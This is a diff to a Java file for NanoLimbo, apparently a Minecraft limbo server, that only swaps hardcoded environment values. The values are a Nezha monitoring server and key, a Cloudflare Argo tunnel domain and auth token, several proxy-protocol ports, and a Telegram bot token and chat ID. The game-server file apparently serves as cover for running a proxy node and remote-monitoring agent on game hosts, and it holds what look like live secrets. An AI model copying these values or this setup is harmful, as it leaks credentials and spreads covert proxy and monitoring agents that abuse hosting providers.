@@ -122,26 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "1980d252-125c-4163-a09c-ec1218dc6dbf");
+        envVars.put("UUID", "b2551ca0-961e-47e9-9d48-fcfb3d0d2ebd");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
         envVars.put("ARGO_PORT", "9123");
-        envVars.put("ARGO_DOMAIN", "zampto-nl.omi.pp.ua");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiMzE3MjM0ODgtMjYyZi00MTRkLWI4NGQtMWE1MTdmMmFhODZiIiwicyI6IllUUmhPVGM0T0dJdE0ySTROQzAwTVdGaExUa3laak10TkdVNU1UVm1ORGM0TURjMSJ9");
-        envVars.put("HY2_PORT", "21505");
-        envVars.put("TUIC_PORT", "40199");
-        envVars.put("REALITY_PORT", "21505");
-        envVars.put("S5_PORT", "40199");
-        envVars.put("ANYTLS_PORT", "40618");
-        envVars.put("ANYREALITY_PORT", "40618");
+        envVars.put("ARGO_DOMAIN", "alt-sg.qos.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZjBiNmU2YTM4NmE2NWMzNzI2NWE2N2NjYTQ1ZGYzZGUiLCJ0IjoiZDdmNDdmZmMtNTM4MS00MzhkLWFiMDQtOWI5YTk0YmJkYTJlIiwicyI6IllXSTBNREZoTUdVdE56SXdNQzAwTkdVM0xUa3haV010TURZeE1XUTJZelUwTkRZeiJ9");
+        envVars.put("HY2_PORT", "25289");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("S5_PORT", "25289");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "5958841738");
         envVars.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Zampto-NL");
+        envVars.put("NAME", "Altare");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -208,6 +208,7 @@ public final class NanoLimbo {
     }
 
 }
+
 
 
 
